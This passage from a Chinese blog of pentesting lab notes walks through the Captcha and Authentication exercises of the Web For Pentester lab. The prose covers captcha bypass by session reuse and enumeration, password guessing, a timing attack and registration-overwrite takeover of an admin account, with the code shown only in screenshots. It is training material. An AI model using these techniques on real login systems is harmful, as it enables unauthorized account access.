<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/3-1.png" alt="3-1"></p>
<p>四、Example 4</p>
<p>4.1 输入正确一次，就会有一个session</p>
<p>之后一直使用这个session就可以了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/4-1.png" alt="4-1"></p>
<p>五、Example 5</p>
<p>5.1 枚举</p>
<p>发现验证码就那几个单词，可以通过枚举单词进行captcha验证</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/5-1.png" alt="5-1"></p>
<p>5.2 将图片保存下来，并把验证码写成文件名</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/5-2.png" alt="5-2"></p>
<p>5.3 编写Python代码，返回页面存在Success则说明登陆成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/5-3.png" alt="5-3"></p>
<p>六、Example 6</p>
<p>6.1 算术运算的验证码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/6-1.png" alt="6-1"></p>
<p>6.2 直接匹配然后提交数据</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/6-2.png" alt="6-2"></p>
<p>6.3 看到Success说明成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/6-3.png" alt="6-3"></p>
<hr>
<h1 id="（十二）Authentication"><a href="#（十二）Authentication" class="headerlink" title="（十二）Authentication"></a>（十二）Authentication</h1><h2 id="【原理】-11"><a href="#【原理】-11" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）身份认证bypass练习。Authentication即身份验证，在.NET Framework安全中，通过对照某些机构检查用户的凭据，发现和验证主体标识的过程</p>
<h2 id="【步骤】-10"><a href="#【步骤】-10" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
<p>1.1 提示我们用户名是root，但是密码不知道，需要去猜测，试一下password</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/1-1.png" alt="1-1"></p>
<p>1.2 密码错误，再试一下密码admin</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/1-1.png" alt="1-1"></p>
<p>1.3 登陆成功，密码就是admin</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/1-3.png" alt="1-3"></p>
<p>二、Example 2</p>
<p>2.1 提示账号是hacker，密码无法猜测，只能去找</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-1.png" alt="2-1"></p>
<p>2.2 使用脚本进行猜测</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-2.png" alt="2-2"></p>
<p>2.3 解密过程如下</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-3.png" alt="2-3"></p>
<p>2.4 根据响应时间判断密码</p>
<p>由猜解过程中花费的时间可知猜解字母p时处理的时间最长，所以密码的首字母为p，猜解结果为25既字母p，提示选择某个字符，这里选择25既字母p继续进行猜解。同理得到第二个字母。。。最后密码是p4ssw0rd</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-4.png" alt="2-4"></p>
<p>2.5 用猜测的密码进行登录</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-5.png" alt="2-5"></p>
<p>2.6 登陆成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-6.png" alt="2-6"></p>
<p>三、Example 5</p>
<p>3.1 注册业务逻辑漏洞</p>
<p>除了登陆之外，还有注册功能，猜测是业务逻辑漏洞，注册的时候没有做大小写判断，产生了注册覆盖，那么注册一个Admin就可以进行登陆了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/3-1.png" alt="3-1"></p>
<p>3.2 注册用户Admin，密码123456，提交</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/3-2.png" alt="3-2"></p>
<p>3.3 成功注册并且以admin用户登陆</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/3-3.png" alt="3-3"></p>
<p>四、Example 4</p>
<p>4.1 同样有注册功能，mysql会忽略掉随在字符串后面的空格，利用这个注册覆盖</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/4-1.png" alt="4-1"></p>
<p>4.2 注册时，admin后面有空格</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/4-2.png" alt="4-2"></p>
<p>4.3 成功注册并且以admin身份登陆</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/4-3.png" alt="4-3"></p>
<hr>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/knlvre.github.io/statics/forhim.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ico/HaZong.jpg" height=300 width=300></img>
                    <p>Knlvre</p>
                    <span>Notes During Information Security Learning.</span>
                    <dl>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">60 <p>Articles</p></a></li>
                    <li><a href="/categories">0 <p>Categories</p></a></li>
                    <li><a href="/tags">9 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#（一）文件上传漏洞"><span class="toc-number">1.</span> <span class="toc-text">（一）文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】"><span class="toc-number">1.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】"><span class="toc-number">1.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（二）LDAP-attacks"><span class="toc-number">2.</span> <span class="toc-text">（二）LDAP attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-1"><span class="toc-number">2.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-1"><span class="toc-number">2.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（三）命令注入"><span class="toc-number">3.</span> <span class="toc-text">（三）命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-2"><span class="toc-number">3.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-2"><span class="toc-number">3.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（四）代码注入"><span class="toc-number">4.</span> <span class="toc-text">（四）代码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-3"><span class="toc-number">4.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-3"><span class="toc-number">4.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（五）文件包含"><span class="toc-number">5.</span> <span class="toc-text">（五）文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-4"><span class="toc-number">5.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-4"><span class="toc-number">5.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（六）目录遍历"><span class="toc-number">6.</span> <span class="toc-text">（六）目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-5"><span class="toc-number">6.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-5"><span class="toc-number">6.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（七）SQL注入"><span class="toc-number">7.</span> <span class="toc-text">（七）SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-6"><span class="toc-number">7.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-6"><span class="toc-number">7.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（八）XSS攻击"><span class="toc-number">8.</span> <span class="toc-text">（八）XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-7"><span class="toc-number">8.1.</span> <span class="toc-text">【原理】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（九）MongoDB"><span class="toc-number">9.</span> <span class="toc-text">（九）MongoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-8"><span class="toc-number">9.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-7"><span class="toc-number">9.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（十）Authorization"><span class="toc-number">10.</span> <span class="toc-text">（十）Authorization</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-9"><span class="toc-number">10.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-8"><span class="toc-number">10.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（十一）Captcha"><span class="toc-number">11.</span> <span class="toc-text">（十一）Captcha</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-10"><span class="toc-number">11.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-9"><span class="toc-number">11.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#（十二）Authentication"><span class="toc-number">12.</span> <span class="toc-text">（十二）Authentication</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【原理】-11"><span class="toc-number">12.1.</span> <span class="toc-text">【原理】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【步骤】-10"><span class="toc-number">12.2.</span> <span class="toc-text">【步骤】</span></a></li></ol></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2019
        <span class="gradient-text">
            Knlvre
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/knlvre.github.io/js/plugin.js"></script>
<script src="/knlvre.github.io/js/obsidian.js"></script>
<script src="/knlvre.github.io/js/jquery.truncate.js"></script>
<script src="/knlvre.github.io/js/search.js"></script>
<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>



    <script src="/knlvre.github.io/js/busuanzi.min.js"></script>
    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>


<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Notes During Information Security Learning.", "信息安全学习过程中的笔记。"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
